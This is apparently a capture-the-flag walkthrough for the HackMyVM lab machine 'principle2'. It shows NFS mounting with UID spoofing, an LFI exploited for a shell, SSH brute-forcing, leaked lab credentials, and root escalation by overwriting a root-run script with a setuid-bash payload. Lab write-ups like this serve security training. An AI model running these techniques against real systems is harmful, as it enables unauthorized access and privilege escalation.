# principle2 - A HackMyVM Machine

MACHINE IP: 192.168.1.35
host name: principle2.hmv

Masscan results:
```
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2024-06-07 12:13:37 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 41789/tcp on 192.168.1.35                                 
Discovered open port 43853/tcp on 192.168.1.35                                 
Discovered open port 58861/tcp on 192.168.1.35                                 
Discovered open port 111/tcp on 192.168.1.35                                   
Discovered open port 43569/tcp on 192.168.1.35                                 
Discovered open port 2049/tcp on 192.168.1.35                                  
Discovered open port 139/tcp on 192.168.1.35                                   
Discovered open port 80/tcp on 192.168.1.35                                    
Discovered open port 35625/tcp on 192.168.1.35
```

An nmap scan reveals that the server is running some RPC and samba smb.

Using the command
showmount -e principle2.hmv 

gives this output
```
Export list for principle2.hmv:
/var/backups *
/home/byron  *
```

Now I am not particulary knowledgable on microsoft rpc and what I did above was by watching youtube (not seeing a walkthrough of this machine).

Now, with some magic (that I ripped off this youtube video right [here](https://www.youtube.com/watch?v=i0_t3zl_X_E)) I mounted a filesystem to the nfs. This revealed 2 files, memory.txt and mayor.txt

Apparently there are passwords stored in hexadecimal available somewhere so I am gonna try and do it again and mount a tmp dir to another available directory, which is /var/backups

I tried even more enumeration with enum4linux and I managed to find some publicly accessible shares. I accessed it as follows:
smbclient \\ip\share 

So after mounting /var/backups we can see that there is no permission to read any of the files. So instead, I created a new user as follows:
```bash
sudo useradd -u 54 hmv
```
which created a user hmv with uid 54

Now when I try to read the files with the command
```bash
sudo -u hmv cat backups/*.txt
```
I can read the files. Now we know that they are in hexadecimal, so let's try and log in.

The password to the hermanubis share is **ByronIsAsshole**

The file reveals a website **thetruthoftalos.hmv**

Add it to /etc/hosts and go to index.php

This contains an LFI vulnerability found using [LFITester](https://github.com/kostas-pa/LFITester).

Now by using the --autopwn option on the tool i managed to get a shell. I upgraded this shell and we now had initial access.

Now we can login as www-data. Change this to hermanubis and use the given password. Once that is done, we can try to login as melville. 
In hermanubis a file called investigation.txt reveals that the password is in the database for city we obtained. 
So use hydra and bruteforce the ssh to melville. Alternatively you can use a tool called [suBF.sh](https://github.com/carlospolop/su-bruteforce/blob/master/suBF.sh) and then get the credentials.

***melville:1bd5528b6def9812acba8eb21562c3ec***

Now once you log in, you will see that the process /usr/local/share/report can be exploited for privesc (found in linpeas.sh).

So in the home dir, create a file report with the following content:
```bash
#! /bin/bash

chmod u+s /bin/bash
```

Now copy this file to the location of the original using
```bash
cp report /usr/local/share/report
```

Now run the command 
```bash
bash -p
```

We are root
